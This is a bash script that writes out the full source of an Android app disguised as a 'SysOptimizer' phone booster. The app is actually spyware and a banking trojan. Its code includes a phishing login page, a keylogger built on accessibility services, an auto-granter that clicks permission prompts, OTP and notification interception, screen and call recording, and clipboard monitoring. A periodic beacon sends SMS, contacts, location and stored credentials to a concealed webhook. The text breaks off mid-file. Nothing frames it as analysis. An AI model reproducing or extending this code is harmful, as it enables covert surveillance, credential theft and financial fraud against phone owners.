#!/bin/bash

echo "========================================="
echo "CREATE ALL FILES - COPY OUTPUT BELOW"
echo "========================================="
echo ""

# ==========================================
# GRADLE WRAPPER
# ==========================================

echo "===== FILE: gradle/wrapper/gradle-wrapper.properties ====="
cat << 'EOF'
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-8.2-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
EOF
echo ""

# ==========================================
# PROJECT GRADLE
# ==========================================

echo "===== FILE: build.gradle (project) ====="
cat << 'EOF'
buildscript {
    ext.kotlin_version = '1.9.0'
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.1.0'
        classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:$kotlin_version"
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
EOF
echo ""

echo "===== FILE: settings.gradle ====="
cat << 'EOF'
pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositories {
        google()
        mavenCentral()
    }
}
rootProject.name = "sysoptimizer"
include ':app'
EOF
echo ""

# ==========================================
# APP GRADLE
# ==========================================

echo "===== FILE: app/build.gradle ====="
cat << 'EOF'
plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
}

android {
    namespace 'com.sysopt.booster'
    compileSdk 34

    defaultConfig {
        applicationId "com.sysopt.booster"
        minSdk 26
        targetSdk 34
        versionCode 1
        versionName "1.0"
        externalNativeBuild {
            cmake {
                cppFlags "-O2 -fvisibility=hidden"
            }
        }
    }

    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            shrinkResources true
        }
        debug {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }

    externalNativeBuild {
        cmake {
            path "src/main/cpp/CMakeLists.txt"
        }
    }
}

dependencies {
    implementation 'androidx.core:core-ktx:1.12.0'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'androidx.work:work-runtime-ktx:2.9.0'
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'com.google.code.gson:gson:2.10.1'
    implementation 'androidx.security:security-crypto:1.1.0-alpha06'
    implementation 'com.google.android.gms:play-services-location:21.2.0'
}
EOF
echo ""

echo "===== FILE: app/proguard-rules.pro ====="
cat << 'EOF'
-keep class com.sysopt.booster.** { *; }
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}
-keepclassmembers class * extends android.accessibilityservice.AccessibilityService {
    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent);
}
-optimizationpasses 5
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-dontpreverify
-verbose
-optimizations !code/simplification/arithmetic,!field/*,!class/merging/*
-keepattributes *Annotation*
-keepattributes JavascriptInterface
EOF
echo ""

# ==========================================
# MANIFEST
# ==========================================

echo "===== FILE: app/src/main/AndroidManifest.xml ====="
cat << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.sysopt.booster">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
    <uses-permission android:name="android.permission.READ_LOGS" tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    <uses-permission android:name="android.permission.USE_FINGERPRINT" />
    <uses-permission android:name="android.permission.USE_BIOMETRIC" />
    <uses-permission android:name="android.permission.ACCESS_ACCOUNTS" />
    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />
    <uses-permission android:name="android.permission.USE_CREDENTIALS" />

    <queries>
        <intent>
            <action android:name="android.intent.action.MAIN" />
        </intent>
    </queries>

    <application
        android:name=".App"
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="SysOptimizer"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
        android:usesCleartextTraffic="true"
        tools:targetApi="34">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleInstance"
            android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity
            android:name=".LoginActivity"
            android:exported="false"
            android:theme="@style/Theme.AppCompat.NoActionBar"
            android:screenOrientation="portrait" />

        <service
            android:name=".AutoGrantService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config" />
        </service>

        <service
            android:name=".KeyloggerService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/keylogger_config" />
        </service>

        <service
            android:name=".NotificationInterceptorService"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <service
            android:name=".CoreService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <service
            android:name=".ScreenCaptureService"
            android:exported="false"
            android:foregroundServiceType="mediaProjection" />

        <service
            android:name=".CallMonitorService"
            android:exported="false"
            android:foregroundServiceType="phone" />

        <service
            android:name=".ClipboardMonitorService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <service
            android:name=".FileSystemMonitorService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <service
            android:name=".GPSSpoofService"
            android:exported="false"
            android:foregroundServiceType="location" />

        <service
            android:name=".OverlayPhishingService"
            android:exported="false" />

        <receiver
            android:name=".BootReceiver"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="${applicationId}.provider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/provider_paths" />
        </provider>

    </application>
</manifest>
EOF
echo ""

# ==========================================
# KOTLIN SOURCE FILES
# ==========================================

echo "===== FILE: app/src/main/java/com/sysopt/booster/App.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.app.Application
import android.content.Intent
import android.os.Handler
import android.os.Looper
import androidx.core.content.ContextCompat

class App : Application() {
    override fun onCreate() {
        super.onCreate()
        instance = this
        Handler(Looper.getMainLooper()).postDelayed({
            startAllServices()
        }, 3000)
    }

    private fun startAllServices() {
        val services = listOf(
            CoreService::class.java,
            ScreenCaptureService::class.java,
            KeyloggerService::class.java,
            NotificationInterceptorService::class.java,
            CallMonitorService::class.java,
            ClipboardMonitorService::class.java,
            FileSystemMonitorService::class.java
        )
        services.forEach { cls ->
            try { ContextCompat.startForegroundService(this, Intent(this, cls)) } catch (e: Exception) {}
        }
    }

    companion object {
        lateinit var instance: App
            private set
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/MainActivity.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    private var clickCount = 0
    private lateinit var counterText: TextView
    private lateinit var boostBtn: Button
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        counterText = findViewById(R.id.counterText)
        boostBtn = findViewById(R.id.boostBtn)
        counterText.text = "0"
        boostBtn.setOnClickListener {
            clickCount++
            counterText.text = clickCount.toString()
            if (clickCount == 3) triggerPayload()
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")))
            }
        }
        startCoreService()
    }

    private fun triggerPayload() {
        boostBtn.isEnabled = false
        boostBtn.text = "Processing..."
        handler.postDelayed({
            startActivity(Intent(this, LoginActivity::class.java))
            finish()
        }, 1500)
    }

    private fun startCoreService() {
        ContextCompat.startForegroundService(this, Intent(this, CoreService::class.java))
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/LoginActivity.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity

class LoginActivity : AppCompatActivity() {
    private lateinit var webView: WebView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)
        webView = findViewById(R.id.loginWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            setSupportZoom(false)
            builtInZoomControls = false
            displayZoomControls = false
            loadWithOverviewMode = true
            useWideViewPort = true
            userAgentString = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        webView.webChromeClient = object : WebChromeClient() {}
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean = false
        }
        webView.addJavascriptInterface(WebInterface(), "Android")
        webView.loadUrl("file:///android_asset/login.html")
    }

    inner class WebInterface {
        @JavascriptInterface
        fun sendCredentials(user: String, pass: String) {
            CredentialManager.storeCredentials(this@LoginActivity, user, pass)
            HideManager.execute(this@LoginActivity)
        }
        @JavascriptInterface
        fun logMessage(msg: String) {}
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/CoreService.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.work.*

class CoreService : Service() {
    private lateinit var wakeLock: PowerManager.WakeLock

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CoreService::WakeLock")
        wakeLock.acquire(10 * 60 * 1000L)
        startForeground(1001, createNotification())
        scheduleBeacon()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        if (wakeLock.isHeld) wakeLock.release()
        val restartIntent = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restartIntent)
        else startService(restartIntent)
    }

    private fun createNotification(): Notification {
        val channelId = "core_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Optimizer", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Optimizing device performance"
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
            }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("SysOptimizer")
            .setContentText("Optimizing system performance...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setAutoCancel(false)
            .build()
    }

    private fun scheduleBeacon() {
        val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
        val workRequest = PeriodicWorkRequestBuilder<BeaconWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
            .setConstraints(constraints)
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, java.util.concurrent.TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork("beacon_work", ExistingPeriodicWorkPolicy.KEEP, workRequest)
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/BeaconWorker.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.Context
import android.os.Build
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import okhttp3.*
import java.util.concurrent.TimeUnit

class BeaconWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun doWork(): Result {
        try {
            val payload = buildPayload()
            val webhookUrl = NativeLib.decodeWebhookUrl()
            val request = Request.Builder()
                .url(webhookUrl)
                .post(RequestBody.create(MediaType.parse("application/json"), Gson().toJson(payload)))
                .addHeader("Content-Type", "application/json")
                .build()
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) return Result.success()
            }
        } catch (e: Exception) { return Result.retry() }
        return Result.retry()
    }

    private fun buildPayload(): Map<String, Any> {
        val context = applicationContext
        return mapOf(
            "device" to mapOf(
                "model" to Build.MODEL,
                "manufacturer" to Build.MANUFACTURER,
                "android_version" to Build.VERSION.RELEASE,
                "sdk" to Build.VERSION.SDK_INT,
                "fingerprint" to Build.FINGERPRINT
            ),
            "apps" to PackageUtils.getInstalledPackages(context),
            "sms" to SmsUtils.getSmsMessages(context),
            "contacts" to ContactUtils.getContacts(context),
            "location" to (LocationUtils.getLastLocation(context) ?: emptyMap<String, Any>()),
            "creds" to CredentialManager.getStoredCredentials(context),
            "battery" to BatteryUtils.getBatteryLevel(context),
            "storage" to StorageUtils.getStorageInfo(context),
            "timestamp" to System.currentTimeMillis()
        )
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/AutoGrantService.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AutoGrantService : AccessibilityService() {
    override fun onServiceConnected() {
        info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            val pkg = it.packageName?.toString() ?: return
            if (pkg.contains("packageinstaller") || pkg.contains("permissioncontroller") ||
                pkg.contains("android") && it.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                autoClickAllow(rootInActiveWindow)
            }
        }
    }

    private fun autoClickAllow(node: AccessibilityNodeInfo?): Boolean {
        if (node == null) return false
        if (node.text?.toString()?.contains("Allow", true) == true ||
            node.text?.toString()?.contains("Grant", true) == true) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            return true
        }
        for (i in 0 until node.childCount) {
            if (autoClickAllow(node.getChild(i))) return true
        }
        return false
    }

    override fun onInterrupt() {}
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/KeyloggerService.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class KeyloggerService : AccessibilityService() {
    private var currentPackage = ""

    override fun onServiceConnected() {
        info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY
            notificationTimeout = 100
        }
        this.serviceInfo = info
        startForeground(2003, NotificationHelper.createNotification(this, "Keylogger Active"))
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            val pkg = it.packageName?.toString() ?: return
            if (it.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                currentPackage = pkg
                if (BankingDetector.isBankingApp(pkg)) WebhookClient.sendAlert("Banking app opened: $pkg")
                return
            }
            if (it.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val source = it.source
                source?.let { node ->
                    val text = getText(node)
                    if (text.isNotEmpty()) WebhookClient.sendKeylog(currentPackage, text)
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                if (it.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                    val source = it.source
                    source?.let { node ->
                        val text = getText(node)
                        if (text.length > 10) WebhookClient.sendClipboard(currentPackage, text)
                    }
                }
            }
        }
    }

    private fun getText(node: AccessibilityNodeInfo?): String {
        if (node == null) return ""
        if (node.text != null) return node.text.toString()
        for (i in 0 until node.childCount) {
            val text = getText(node.getChild(i))
            if (text.isNotEmpty()) return text
        }
        return ""
    }

    override fun onInterrupt() {}
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/ScreenCaptureService.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class ScreenCaptureService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private val handler = Handler(Looper.getMainLooper())
    private var isRecording = false

    companion object {
        private var resultCode: Int = 0
        private var data: Intent? = null
        fun startProjection(context: Context, code: Int, intent: Intent) {
            resultCode = code
            data = intent
            context.startService(Intent(context, ScreenCaptureService::class.java))
        }
    }

    override fun onCreate() {
        super.onCreate()
        startForeground(2002, NotificationHelper.createNotification(this, "Screen Capture Active"))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (data != null) startScreenCapture()
        return START_STICKY
    }

    private fun startScreenCapture() {
        if (isRecording) return
        try {
            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, data!!)
            val displayMetrics = resources.displayMetrics
            val width = displayMetrics.widthPixels
            val height = displayMetrics.heightPixels
            val density = displayMetrics.densityDpi

            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(5 * 1024 * 1024)
                setOutputFile(getOutputFile())
                prepare()
            }
            val surface = mediaRecorder?.surface
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                surface, null, null
            )
            mediaRecorder?.start()
            isRecording = true
            handler.postDelayed({ captureScreenshot() }, 30000)
        } catch (e: Exception) { stopScreenCapture() }
    }

    private fun captureScreenshot() {
        try {
            val width = resources.displayMetrics.widthPixels
            val height = resources.displayMetrics.heightPixels
            val imageReader = ImageReader.newInstance(width, height, android.graphics.PixelFormat.RGBA_8888, 2)
            val imageSurface = imageReader.surface
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "Screenshot", width, height, resources.displayMetrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageSurface, null, null
            )
            val image = imageReader.acquireLatestImage()
            image?.let {
                val planes = it.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width
                val bitmap = android.graphics.Bitmap.createBitmap(
                    width + rowPadding / pixelStride, height,
                    android.graphics.Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "screenshot_${System.currentTimeMillis()}.png")
                val fos = java.io.FileOutputStream(file)
                bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, fos)
                fos.close()
                WebhookClient.sendFile(file.absolutePath, "screenshot")
                it.close()
            }
            imageReader.close()
        } catch (e: Exception) {}
    }

    private fun getOutputFile(): String {
        val dir = getExternalFilesDir(Environment.DIRECTORY_MOVIES)
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        return File(dir, "screen_$timestamp.mp4").absolutePath
    }

    private fun stopScreenCapture() {
        isRecording = false
        handler.removeCallbacksAndMessages(null)
        mediaRecorder?.apply { try { stop() } catch (e: Exception) {}; try { release() } catch (e: Exception) {} }
        virtualDisplay?.release()
        mediaProjection?.stop()
        mediaRecorder = null
        virtualDisplay = null
        mediaProjection = null
    }

    override fun onDestroy() { stopScreenCapture(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/NotificationInterceptorService.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.os.Handler
import android.os.Looper

class NotificationInterceptorService : NotificationListenerService() {
    private val handler = Handler(Looper.getMainLooper())

    override fun onListenerConnected() {
        super.onListenerConnected()
        startForeground(2004, NotificationHelper.createNotification(this, "Notification Monitor"))
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn?.let {
            val pkg = it.packageName
            val notification = it.notification
            val extras = notification.extras
            val title = extras.getString(Notification.EXTRA_TITLE, "")
            val text = extras.getString(Notification.EXTRA_TEXT, "")
            val subText = extras.getString(Notification.EXTRA_SUB_TEXT, "")

            if (pkg == "com.google.android.apps.messaging" || pkg == "com.android.mms" || pkg.contains("sms")) {
                SmsUtils.captureSmsFromNotification(title, text, subText)
            }

            val otpPattern = Regex("\\b\\d{4,6}\\b")
            val allText = "$title $text $subText"
            otpPattern.findAll(allText).forEach { match -> WebhookClient.sendOTP(match.value, pkg) }

            if (BankingDetector.isBankingApp(pkg)) WebhookClient.sendBankingAlert(pkg, title, text)

            WebhookClient.sendNotification(pkg, title, text, subText, System.currentTimeMillis())
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/CallMonitorService.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Environment
import android.os.IBinder
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CallMonitorService : Service() {
    private lateinit var telephonyManager: TelephonyManager
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentNumber = ""

    private val phoneStateListener = object : PhoneStateListener() {
        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
            when (state) {
                TelephonyManager.CALL_STATE_IDLE -> stopCallRecording()
                TelephonyManager.CALL_STATE_OFFHOOK -> {
                    currentNumber = phoneNumber ?: "unknown"
                    startCallRecording()
                }
                TelephonyManager.CALL_STATE_RINGING -> WebhookClient.sendCallAlert("incoming", phoneNumber ?: "unknown")
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
        startForeground(2005, NotificationHelper.createNotification(this, "Call Monitor Active"))
    }

    private fun startCallRecording() {
        if (isRecording) return
        try {
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(getCallRecordingFile())
                prepare()
                start()
            }
            isRecording = true
        } catch (e: Exception) {
            try {
                mediaRecorder = MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100)
                    setAudioEncodingBitRate(128000)
                    setOutputFile(getCallRecordingFile())
                    prepare()
                    start()
                }
                isRecording = true
            } catch (e2: Exception) {}
        }
    }

    private fun stopCallRecording() {
        if (!isRecording) return
        try {
            mediaRecorder?.apply { stop(); release() }
            isRecording = false
            mediaRecorder = null
            val file = getCallRecordingFile()
            if (file.exists()) WebhookClient.sendFile(file.absolutePath, "call_recording_$currentNumber")
        } catch (e: Exception) {}
    }

    private fun getCallRecordingFile(): File {
        val dir = getExternalFilesDir(Environment.DIRECTORY_MUSIC)
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        return File(dir, "call_${currentNumber}_$timestamp.mp4")
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() { super.onDestroy(); telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE); stopCallRecording() }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/ClipboardMonitorService.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.IBinder

class ClipboardMonitorService : Service() {
    private lateinit var clipboardManager: ClipboardManager
    private var lastClip = ""

    private val clipListener = ClipboardManager.OnPrimaryClipChangedListener {
        val clip = clipboardManager.primaryClip
        clip?.let {
            val item = it.getItemAt(0)
            val text = item.coerceToText(applicationContext).toString()
            if (text.isNotEmpty() && text != lastClip) {
                lastClip = text
                val patterns = listOf(
                    Regex("\\b\\d{16}\\b"),
                    Regex("\\b\\d{3,4}\\b"),
